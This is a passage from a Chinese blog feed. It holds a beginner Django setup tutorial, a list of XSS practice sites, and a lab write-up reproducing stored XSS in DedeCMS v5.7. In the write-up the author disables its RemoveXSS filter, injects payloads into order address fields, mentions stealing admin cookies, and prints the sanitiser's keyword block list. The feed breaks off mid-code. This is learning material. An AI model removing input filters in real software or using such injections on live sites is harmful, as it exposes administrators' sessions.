        <content type="html"><![CDATA[<p>本文主要内容：Django基础概念、环境搭建（python在ubuntu中安装，virtualenv虚拟环境安装，Django1.11.4安装）、创建一个简单的django项目，并创建了简单的初始应用程序</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django001.png" alt=""></p><p>今天我将开始对一个关于Django基础知识的全新系列教程的学习。这是一个开始学习 Django 的完整入门指南。教程材料一共会被分为七个部分，将从安装，开发环境的准备、模型、视图、模板、URL到更高级的主题（如迁移、测试和部署）中详细探讨学习所有基本概念。</p><p>引用中国古代一句话开始新的实践学习<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django002.png" alt=""></p><h2 id="为什么学习Django？"><a href="#为什么学习Django？" class="headerlink" title="为什么学习Django？"></a>为什么学习Django？</h2><p>Django是一个用python编写的Web框架。Web框架是一种软件，基于web框架可以开发动态网站，各种应用程序以及服务。它提供了一系列工具和功能，可以解决许多与Web开发相关的常见问题，比如：安全功能，数据库访问，会话，模板处理，URL路由，国际化，本地化，等等。</p><p>使用诸如 Django 之类的网络框架，使我们能够以标准化的方式快速开发安全可靠的Web应用程序，而无需重新发明轮子。</p><p>那么，Django有什么特别之处呢？对于初学者来说，它是一个Python Web框架，这意味着你可以受益于各种各样的<strong>开源库包</strong>。python软件包资料库（pypi）拥有超过11.6万个软件包（2017年9月6日的数据）。如果当你想要解决一个特定的问题的时候，可能有人已经为它实现了一个库来供你使用。</p><p>Django是用python编写的最流行的web框架之一。它绝对是最完整的，提供了各种各样的<strong>开箱即用</strong>的功能，比如用于开发和测试的独立Web服务器，缓存，中间件系统，ORM，模板引擎，表单处理，基于Python单元测试的工具接口。Django还自带内部电池，提供内置应用程序，比如一个认证系统，一个可用于 CRUD(增删改查) 操作并且自动生成页面的后台管理界面，生成订阅文档（RSS/Atom）,站点地图等。甚至在django中内建了一个地理信息系统（GIS）框架。</p><p>Django的开发得到了Django软件基金会的支持，并且由jetbrains和instagram等公司赞助。Django现在已经存在了相当长的一段时间了。到现在为止，活跃的项目开发时间超过13年，这也证明了它是一个<strong>成熟，可靠和安全</strong>的网络框架。</p><h2 id="谁在使用Django？"><a href="#谁在使用Django？" class="headerlink" title="谁在使用Django？"></a>谁在使用Django？</h2><p>知道谁在使用Django是很好的，同时也想一想你可以用它来做些什么。在使用Django的大型网站有：Instagram，Disqus，Mozilla，Bitbucket，Last.fm，国家地理等。</p><p>想知道更多的示例，你可以到Django Sites数据库中查看，它提供超过五千个Django驱动的网站列表。</p><p>顺便说一下，去年在Django 2016年发布会上，Django核心开发人员，Instagram员工carl meyer，就Instagram如何大规模使用Django以及它如何支持他们的用户增长做过一次分享。这是个一小时的演讲，如果你有兴趣学习了解更多的话，这是一次很有趣的演讲。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>电脑上安装一些程序，以便使用django。基本的设置包括安装Python，Virtualenv和Django。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django003.png" alt=""></p><ul><li>使用虚拟环境，使得在进行项目开发的时，便于使得每个项目会有独立的环境。这样在用Django开发一个网站或Web项目时，安装外部库，不用担心包之间的依赖关系发生冲突。同时，也可使得能够在不同Django版本上运行的本地机器的项目。</li></ul><h3 id="python安装"><a href="#python安装" class="headerlink" title="python安装"></a>python安装</h3><ul><li>python版本选择</li></ul><blockquote><p>本教程选择python版本为3.6.2以上，也可以使用最新python版本</p></blockquote><pre><code>使用Python3，因为大部分主要的Python库已经被移植到python 3，并且下一个主要的django版本（2.x）也将不再支持python 2。所以Python 3是正确的选择。</code></pre><ul><li>本文使用ubuntu16.04进行python的安装，由于ubuntu中python版本分别为python2.7和python3.5.2</li></ul><h4 id="python-3-6-10安装"><a href="#python-3-6-10安装" class="headerlink" title="python 3.6.10安装"></a>python 3.6.10安装</h4><ol><li><p>安装Python软件工具</p><p> sudo apt-get install python-software-properties</p></li><li><p>添加仓库镜像源</p><p> sudo add-apt-repository ppa:fkrull/deadsnakes</p></li><li><p>更新源</p><p> sudo apt-get update</p></li><li><p>从本地仓库安装python</p><p> sudo apt-get install python3.6</p></li></ol><ul><li>终端输入python3.6,启动</li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django03.png" alt=""></p><h3 id="安装-Virtualenv"><a href="#安装-Virtualenv" class="headerlink" title="安装 Virtualenv"></a>安装 Virtualenv</h3><p>通过pip(一个管理和安装Python包的工具)来安装Virtualenv。</p><ol><li><p>查看ubuntu中pip是否安装，默认的pip为Python2的</p><p> pip –version</p></li><li><p>安装pip3</p><p> apt install python3-pip</p></li><li><p>终端执行下面命令：(安装virtualenv）</p><p> <font color=#FF000>sudo pip3 install virtualenv</font></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django04.png" alt=""></p><p>到目前为止，我们执行的安装都是在操作系统环境下运行的。从现在开始，我们安装的所有东西，包括django本身，都将安装在虚拟环境中。</p><p>这样想一下：对于你开始的每个Django项目，你首先会为它创建一个虚拟环境。这就像每个Django项目都有一个沙盒。所以你随意运行，安装软件包，卸载软件包而不会破坏任何东西。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django05.png" alt=""></p><ul><li>virtualenv使用</li></ul><p>创建一个Development文件夹，用其组织自己的项目和网站</p><ol><li><p>为一个工程创建一个虚拟环境</p><p> mkdir myproject<br> cd myproject</p></li><li><p>这个文件夹是级别较高的目录，将存储与我们的Django项目相关的所有文件和东西，包括它的虚拟环境。所以让我们开始创建我们的第一个虚拟环境并安装django。</p></li><li><p>在myproject文件夹中：</p><p> virtualenv venv -p python3.6</p><p> venv是虚拟环境的目录名，-p参数指定python3.6解析器的路径</p></li><li><p>要开始使用虚拟环境，其需要被激活： </p><p> source venv/bin/activate</p></li></ol><p>当在命令行前看到(venv),就代表激活成功，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django06.png" alt=""></p><p>当我们venv开启后，pip程序也安装了，当使用期安装Python软件包（比如Django）时，它将安装在venv环境中</p><p>值得注意的是，在venv环境中，使用命令python（而不是python3.6）来调用python3.6.10，并且仅使用pip（而不是pip3）来安装软件包。</p><ol start="5"><li><p>退出<strong>venv</strong>环境，使用命令：</p><p> deactivate</p></li></ol><h3 id="安装Django-1-11-4"><a href="#安装Django-1-11-4" class="headerlink" title="安装Django 1.11.4"></a>安装Django 1.11.4</h3><p>很简单，现在我们已经启动了venv，运行以下命令来安装django</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pip install django&#x3D;&#x3D;1.11.4</span><br><span class="line"></span><br><span class="line"># 译注：目前django已经升级到2.x版本，这里为了跟后续教程内容保持一直，所以必须指定版本号进行安装</span><br><span class="line"># 除非你有能力 debug，否则不建议你使用django 2.x，等你熟悉Django后，再升级都Django2.0 也不迟，因为两个版本的差异非常小</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django07.png" alt=""></p><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>一切就绪<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django004.png" alt=""></p><h3 id="启动一个新项目"><a href="#启动一个新项目" class="headerlink" title="启动一个新项目"></a>启动一个新项目</h3><ol><li>执行下面的命令来创建一个新的 Django 项目：</li></ol><figure class="highlight"><pre><code class="language-bash" data-lang="bash">django-admin startproject myproject</code></pre></figure>    命令行工具django-admin会在安装Django的时候一起自动安装好。<pre><code>执行了上面的命令以后，系统会为Django项目生成基础文件夹结构</code></pre><ol start="2"><li>myproject目录结构如下所示：</li></ol><figure class="highlight"><pre><code class="language-bash" data-lang="bash">myproject/                  &lt;-- 高级别文件夹 |-- myproject/             &lt;-- Django项目文件夹 |    |-- myproject/ |    |    |-- __init__.py |    |    |-- settings.py |    |    |-- urls.py |    |    |-- wsgi.py |    +-- manage.py +-- venv/                  &lt;-- 虚拟环境文件夹  </code></pre></figure><ol start="3"><li>最初的项目结构由五个文件组成：</li></ol><ul><li><p><strong>manage.py</strong>：使用<strong>django-admin</strong>命令行工具的快捷方式。它用于运行与我们项目相关的管理命令。我们将使用它来运行开发服务器，运行测试，创建迁移等等。</p></li><li><p><strong><code>__init__.py</code></strong>：这个空文件告诉python这个文件夹是一个python包</p></li><li><p><strong>settings.py</strong>：这个文件包含了所有的项目配置。将来我们会一直提到这个文件！</p></li><li><p><strong>urls.py</strong>：这个文件负责映射我们项目中的路由和路径。例如，如果你想在访问URL / about/ 时显示某些内容，则必须先在这里做映射关系。</p></li><li><p><strong>wsgi.py</strong>：该文件是用于部署的简单网关接口。你可以暂且先不用关心她的内容，就先让他在那里就好了。</p></li></ul><p>django自带了一个简单的网络服务器。在开发过程中非常方便，所以我们无需安装任何其他软件即可在本地运行项目。我们可以通过执行命令来测试一下它：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">python manage.py runserver</code></pre></figure>结果图：![](https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django09.png)<p>现在，你可以忽略终端中出现的迁移错误;我们将在稍后讨论。</p><p>现在在Web浏览器中打开URL：<code>http://127.0.0.1:8000</code>，你应该看到下面的页面：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django10.png" alt=""></p><p>使用组合键 Control + C来终止开发服务器。</p><h2 id="Django应用"><a href="#Django应用" class="headerlink" title="Django应用"></a>Django应用</h2><p>在Django的哲学中，我们有两个重要的概念：</p><ul><li><p><strong>app</strong>：是一个可以完成某件事情的Web应用程序。一个应用程序通常由一组<strong>models(数据库表)，views(视图)，templates(模板)，tests(测试)</strong>组成。</p></li><li><p><strong>project</strong>：是配置和应用程序的集合。一个项目可以由多个应用程序或一个应用程序组成。</p></li></ul><p>请注意，如果没有一个project，你就无法运行Django应用程序。像博客这样的简单网站可以完全在单个应用程序中编写，例如可以将其命名为blog或weblog。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django005.png" alt=""></p><p>这是组织源代码的一种方式。现在刚开始，判断什么是或不是应用程序这些还不太重要。包括如何组织代码等。现在不用担心那些问题！首先让我们对Django的API和基础知识进行梳理一遍。</p><p>为了方便说明，我们来创建一个简单的<em>网络论坛或讨论区</em>。要创建我们的第一个应用程序，请跳转到<strong>manage.py</strong>文件所在的目录并执行以下命令：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">django-admin startapp boards</code></pre></figure>注意!我们这次使用的命令是**startapp**。<p>通过这条指令，系统会给我们创建以下目录结构：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">myproject/ |-- myproject/ |    |-- boards/                &lt;-- 我们新的Django应用（app）！ |    |    |-- migrations/ |    |    |    +-- __init__.py |    |    |-- __init__.py |    |    |-- admin.py |    |    |-- apps.py |    |    |-- models.py |    |    |-- tests.py |    |    +-- views.py |    |-- myproject/ |    |    |-- __init__.py |    |    |-- settings.py |    |    |-- urls.py |    |    |-- wsgi.py |    +-- manage.py +-- venv/</code></pre></figure><p>下面，我们来探讨每个文件的作用：</p><ul><li><p><strong>migrations/</strong>：在这个文件夹里，Django会存储一些文件以跟踪你在<strong>models.py</strong>文件中创建的变更，用来保持数据库和models.py的同步。</p></li><li><p><strong>admin.py</strong>：这个文件为一个django内置的应用程序<strong>Django Admin</strong>的配置文件。</p></li><li><p><strong>apps.py</strong>：这是应用程序本身的配置文件。</p></li><li><p><strong>models.py</strong>：这里是我们定义Web应用程序数据实例的地方。models会由Django自动转换为数据库表。</p></li><li><p><strong>tests.py</strong>：这个文件用来写当前应用程序的单元测试。</p></li><li><p><strong>views.py</strong>：这是我们处理Web应用程序请求(request)/响应(resopnse)周期的文件。</p></li></ul><p>现在我们创建了我们的第一个应用程序，让我们来配置一下项目以便启用这个应用程序。</p><p>要做到这一点，打开<strong>settings.py</strong>并尝试找到<code>INSTALLED_APPS</code>变量：</p><p><strong>settings.py</strong></p><figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">INSTALLED_APPS</span> <span class="o">=</span> <span class="p">[</span>    <span class="s">'django.contrib.admin'</span><span class="p">,</span>    <span class="s">'django.contrib.auth'</span><span class="p">,</span>    <span class="s">'django.contrib.contenttypes'</span><span class="p">,</span>    <span class="s">'django.contrib.sessions'</span><span class="p">,</span>    <span class="s">'django.contrib.messages'</span><span class="p">,</span>    <span class="s">'django.contrib.staticfiles'</span><span class="p">,</span><span class="p">]</span></code></pre></figure><p>如你所见，Django默认已经安装了6个内置应用程序。它们提供大多数Web应用程序所需的常用功能，如身份验证，会话，静态文件管理（图像，JavaScript，CSS等）等。</p><p>我们将会在本系列教程中探索这些应用程序。但现在，先不管它们，只需将我们的应用程序<strong>boards</strong>添加到<code>INSTALLED_APPS</code>列表即可</p><figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">INSTALLED_APPS</span> <span class="o">=</span> <span class="p">[</span>    <span class="s">'django.contrib.admin'</span><span class="p">,</span>    <span class="s">'django.contrib.auth'</span><span class="p">,</span>    <span class="s">'django.contrib.contenttypes'</span><span class="p">,</span>    <span class="s">'django.contrib.sessions'</span><span class="p">,</span>    <span class="s">'django.contrib.messages'</span><span class="p">,</span>    <span class="s">'django.contrib.staticfiles'</span><span class="p">,</span>   <span class="s">'boards',# 译者注：建议和作者一样空一行来区别内置app和自定义的app</span><span class="p">,</span><span class="p">]</span></code></pre></figure><p>使用前面漫画正方形和圆圈的比喻，黄色的圆圈就是我们的boards应用程序，<strong>django.contrib.admin, django.contrib.auth</strong>等就是红色的圆圈。</p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>现在来写我们的第一个视图(view)，试试看看如何用Django创建一个新页面。</p><p>打开boards应用程序中的views.py文件，并添加以下代码：</p><p><strong>views.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'Hello, World!'</span>)</span><br></pre></td></tr></table></figure><p>视图是接收<code>httprequest</code>对象并返回一个<code>httpresponse</code>对象的Python函数。接收 <em>request<em>作为参数并返回</em>response</em> 作为结果。这个流程你必须记住！</p><p>上面定义了一个简单的视图，命名为<strong>home</strong>,它简单返回一个信息字符串hello,world!</p><p>Django调用这个view。是在<strong>urls.py</strong>文件中完成：</p><p><strong>urls.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> boards <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^$'</span>,views.home,name=<span class="string">'home'</span>),</span><br><span class="line">    url(<span class="string">r'^admin/'</span>,admin.site.urls),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>将上面的代码片段与你的<strong>urls.py</strong>文件进行比较，你会注意到我添加了以下新代码：<code>url（r&#39;^ $&#39;，views.home，name =&#39;home&#39;</code>，并通过<code>from boards import views</code>从我们的应用程序<strong>boards</strong>中导入了<strong>views</strong>模块</p><p>Django使用<strong>正则表达式</strong>来匹配请求的URL，对于我们的<strong>home</strong>视图，我使用<code>^$</code>正则，它将匹配一个空路径，也就是主页（这个URL：<code>http://127.0.0.1:8000</code>）。如果我想匹配的URL是 <code>http://127.0.0.1:8000/homepage/</code>，那么我的URL正则表达式就会是：<code>url(r&#39;^homepage/$&#39;, views.home, name=&#39;home&#39;)</code>。</p><p>回到manage.py目录，运行</p><p>python manage.py runserver</p><p>并在Web浏览器中，打开 <strong><code>http://127.0.0.1:8000</code></strong></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django11.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是本系列学习的第一部分。本文，学习了如何安装相应的Python版本以及如何设置开发环境。还介绍了虚拟环境，开始了第一个django项目，并已经创建了我们的初始应用程序。</p><p>下部分将学习它的模型，视图，模板和URLs。学习探索Django所有的基础知识！</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Web框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【XSS（一）】1.4 XSS相关资料搜集</title>
      <link href="2020/04/16/1.4%20XSS%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E6%90%9C%E9%9B%86/"/>
      <url>2020/04/16/1.4%20XSS%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>本文主要是一些XSS练习平台、XSS相关知识、或者总结的参考资料搜集。。。</p><a id="more"></a><h3 id="XSS总结"><a href="#XSS总结" class="headerlink" title="XSS总结"></a>XSS总结</h3><p>参考链接：</p><ul><li>【xss总结】<a href="https://xz.aliyun.com/t/4067#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067#toc-0</a></li><li><a href="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a></li><li>【xss总结】<a href="https://blog.csdn.net/qq_29277155/article/details/51320064" target="_blank" rel="noopener">https://blog.csdn.net/qq_29277155/article/details/51320064</a></li><li>【xss-payload】<a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet" target="_blank" rel="noopener">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a></li></ul><h3 id="XSS练习平台1"><a href="#XSS练习平台1" class="headerlink" title="XSS练习平台1"></a>XSS练习平台1</h3><ul><li>参考网址：<a href="http://test.ctf8.com/" target="_blank" rel="noopener">http://test.ctf8.com/</a></li><li>参考答案：<ul><li><a href="https://blog.csdn.net/tutucoo/article/details/104151403" target="_blank" rel="noopener">https://blog.csdn.net/tutucoo/article/details/104151403</a></li><li><a href="https://www.cnblogs.com/bmjoker/p/9446472.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9446472.html</a></li></ul></li></ul><h3 id="XSS练习平台2"><a href="#XSS练习平台2" class="headerlink" title="XSS练习平台2"></a>XSS练习平台2</h3><ul><li><p>链接地址：<a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a></p></li><li><p>参考答案：<a href="https://blog.csdn.net/taozijun/article/details/81277187" target="_blank" rel="noopener">https://blog.csdn.net/taozijun/article/details/81277187</a></p></li></ul><h3 id="XSS练习平台3"><a href="#XSS练习平台3" class="headerlink" title="XSS练习平台3"></a>XSS练习平台3</h3><ul><li><p>链接地址：<a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a></p></li><li><p>参考答案：</p><ul><li><a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="noopener">https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml</a></li><li><a href="https://blog.csdn.net/Ni9htMar3/article/details/77938899" target="_blank" rel="noopener">https://blog.csdn.net/Ni9htMar3/article/details/77938899</a></li></ul></li></ul><h3 id="XSS练习平台4"><a href="#XSS练习平台4" class="headerlink" title="XSS练习平台4"></a>XSS练习平台4</h3><ul><li><p>链接地址：<a href="https://alf.nu/alert1" target="_blank" rel="noopener">https://alf.nu/alert1</a></p></li><li><p>参考答案：<a href="https://www.cnblogs.com/omnis/p/9084461.html" target="_blank" rel="noopener">https://www.cnblogs.com/omnis/p/9084461.html</a></p></li></ul><h3 id="待续………"><a href="#待续………" class="headerlink" title="待续………"></a>待续………</h3>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【XSS（一）】1.3 存储型XSS多场景实践及绕过</title>
      <link href="2020/04/16/1.3%20%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%A4%9A%E5%9C%BA%E6%99%AF%E5%AE%9E%E8%B7%B5%E5%8F%8ABypass/"/>
      <url>2020/04/16/1.3%20%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%A4%9A%E5%9C%BA%E6%99%AF%E5%AE%9E%E8%B7%B5%E5%8F%8ABypass/</url>
      
        <content type="html"><![CDATA[<p>本文选取了DedeCMS_v5.7（存储型XSS）、phpmywind5.3（存储型XSS,编辑后触发）、Yiqicms1.9（存储型XSS,多次提交绕过)等进行了环境的复现、漏洞的绕过、漏洞的验证、漏洞的简单修复、及利用</p><a id="more"></a><h2 id="0x01-存储型XSS"><a href="#0x01-存储型XSS" class="headerlink" title="0x01 存储型XSS"></a>0x01 存储型XSS</h2><h3 id="1-1-DedeCMS-v5-7"><a href="#1-1-DedeCMS-v5-7" class="headerlink" title="1.1 DedeCMS_v5.7"></a>1.1 DedeCMS_v5.7</h3><ul><li><p>下载地址：</p><p>  链接：<a href="https://pan.baidu.com/s/116RsJoRbQ9rpVaq_64QUqA" target="_blank" rel="noopener">https://pan.baidu.com/s/116RsJoRbQ9rpVaq_64QUqA</a><br>  提取码：eiuo</p></li><li><p>本地环境配置</p><p>  windows+phpstudy+php5.4.45</p><p>  将下载后的软件放于WWW目录下,按步骤安装即可</p></li><li><p>测试说明</p><ul><li>上述下载的版本存在的XSS漏洞以及修复，但是亦可能存在未发现的XSS漏洞，此博文为了理解XSS原理，以便自身对XSS测试思路理解</li><li>在已修复状态下，复现漏洞环境，并分析修复代码</li></ul></li><li><p>复现的漏洞要求：</p><p>  该漏洞 通过用户在编写订单收货地址的相关参数 注入 XSS Payload，导致 前台查看订单的页面和后台管理员查看订单详情的页面都会被 XSS。<br>  所以说，可以用来打管理员 Cookie 。</p></li><li><p>准备：</p><p>  1.首先管理员登录后台/dede，添加商品销售栏目<img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss01.png" alt=""><br>  2.为商品栏目添加一个商品 <img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss02.png" alt=""></p></li><li><p>前台用户选定商品添加购物车：（这里方便测试，选定admin用户）<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss03.png" alt=""></p></li><li><p>前台用户编辑订单的收货地址，在这里 address,des,email,postname 都是存在 XSS 的，插入 XSS Payload<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss04.png" alt=""></p></li><li><p>查看订单详情，发现插入的XSS Payload都被过滤(说明在提交订单后，对订单内容进行了XSS过滤)<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss05.png" alt=""></p></li><li><p>由于订单页面：carbuyaction.php，本地文件查看找到如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$address     = cn_substrR(trim(RemoveXSS($address)),<span class="number">200</span>);</span><br><span class="line">$des             = cn_substrR(RemoveXSS($des),<span class="number">100</span>);</span><br><span class="line">$postname = cn_substrR(trim(RemoveXSS($postname)),<span class="number">15</span>);</span><br><span class="line">$tel            = preg_replace(<span class="string">"#[^-0-9,\/\| ]#"</span>, <span class="string">""</span>, $tel);</span><br><span class="line">$zip            = preg_replace(<span class="string">"#[^0-9]#"</span>, <span class="string">""</span>, $zip);</span><br><span class="line">$email        = cn_substrR(RemoveXSS($email),<span class="number">255</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($tel))</span><br></pre></td></tr></table></figure><p>  分析：这段代码分别进行了，RemoveXSS、trim、cn_substrR等相应处理，先将地址的RemoveXSS函数过滤去掉，再进行XSS payload提交</p></li><li><p>再次，提交商品，查看提交XSS payload的订单详情<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss06.png" alt=""></p><p>  分析：发现未使用RemoveXSS函数过滤时，地址存在XSS漏洞</p></li><li><p>查看后台管理员中，商品订单记录<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss07.png" alt=""></p></li><li><p>RemoveXSS函数查找</p><p> 添加如下代码放置对应文件中(carbuyaction.php）,重新提交订单，即可显示函数具体位置</p><p>  //测试RemoveXSS位置<br>  $func = new ReflectionFunction(‘RemoveXSS’);<br>   var_dump($func-&gt;getFileName());</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss09.png" alt=""></p><ul><li><p>查找结果<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20415xss08.png" alt=""></p></li><li><p>RemoveXSS代码如下：</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RemoveXSS</span><span class="params">($val)</span> </span>&#123;</span><br><span class="line">   $val = preg_replace(<span class="string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>, <span class="string">''</span>, $val);</span><br><span class="line">   $search = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span>;</span><br><span class="line">   $search .= <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>;</span><br><span class="line">   $search .= <span class="string">'1234567890!@#$%^&amp;*()'</span>;</span><br><span class="line">   $search .= <span class="string">'~`";:?+/=&#123;&#125;[]-_|\'\\'</span>;</span><br><span class="line">   <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($search); $i++) &#123;</span><br><span class="line">      $val = preg_replace(<span class="string">'/(&amp;#[xX]0&#123;0,8&#125;'</span>.dechex(ord($search[$i])).<span class="string">';?)/i'</span>, $search[$i], $val); <span class="comment">// with a ;</span></span><br><span class="line">      $val = preg_replace(<span class="string">'/(&amp;#0&#123;0,8&#125;'</span>.ord($search[$i]).<span class="string">';?)/'</span>, $search[$i], $val); <span class="comment">// with a ;</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $ra1 = <span class="keyword">array</span>(<span class="string">'javascript'</span>, <span class="string">'vbscript'</span>, <span class="string">'expression'</span>, <span class="string">'applet'</span>, <span class="string">'meta'</span>, <span class="string">'xml'</span>, <span class="string">'blink'</span>, <span class="string">'link'</span>, <span class="string">'style'</span>, <span class="string">'script'</span>, <span class="string">'embed'</span>, <span class="string">'object'</span>, <span class="string">'iframe'</span>, <span class="string">'frame'</span>, <span class="string">'frameset'</span>, <span class="string">'ilayer'</span>, <span class="string">'layer'</span>, <span class="string">'bgsound'</span>, <span class="string">'title'</span>, <span class="string">'base'</span>);</span><br><span class="line">   $ra2 = <span class="keyword">array</span>(<span class="string">'onabort'</span>, <span class="string">'onactivate'</span>, <span class="string">'onafterprint'</span>, <span class="string">'onafterupdate'</span>, <span class="string">'onbeforeactivate'</span>, <span class="string">'onbeforecopy'</span>, <span class="string">'onbeforecut'</span>, <span class="string">'onbeforedeactivate'</span>, <span class="string">'onbeforeeditfocus'</span>, <span class="string">'onbeforepaste'</span>, <span class="string">'onbeforeprint'</span>, <span class="string">'onbeforeunload'</span>, <span class="string">'onbeforeupdate'</span>, <span class="string">'onblur'</span>, <span class="string">'onbounce'</span>, <span class="string">'oncellchange'</span>, <span class="string">'onchange'</span>, <span class="string">'onclick'</span>, <span class="string">'oncontextmenu'</span>, <span class="string">'oncontrolselect'</span>, <span class="string">'oncopy'</span>, <span class="string">'oncut'</span>, <span class="string">'ondataavailable'</span>, <span class="string">'ondatasetchanged'</span>, <span class="string">'ondatasetcomplete'</span>, <span 